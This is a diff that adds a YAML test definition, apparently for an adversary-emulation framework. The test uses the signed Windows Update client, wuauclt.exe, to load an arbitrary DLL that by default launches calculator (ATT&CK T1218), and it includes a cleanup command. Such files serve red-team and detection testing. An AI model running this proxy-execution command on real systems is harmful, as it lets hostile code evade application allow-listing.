@@ -1,0 +1,16 @@
+---
+- id: e98dca25c75b326cbd7f83e5c79feea8
+  name: Load Arbitrary DLL via Wuauclt (Windows Update Client)
+  description: "This test uses Wuauclt to load an arbitrary DLL. Upon execution with\
+    \ the default inputs, calculator.exe will be launched. \nSee https://dtm.uk/wuauclt/\n"
+  tactic: stealth
+  technique:
+    attack_id: T1218
+    name: Signed Binary Proxy Execution
+  platforms:
+    windows:
+      cmd:
+        command: wuauclt.exe /UpdateDeploymentProvider "6349c0_calc.dll" /RunHandlerComServer
+        payloads:
+        - 6349c0_calc.dll
+        cleanup: taskkill /f /im calculator.exe > nul 2>&1
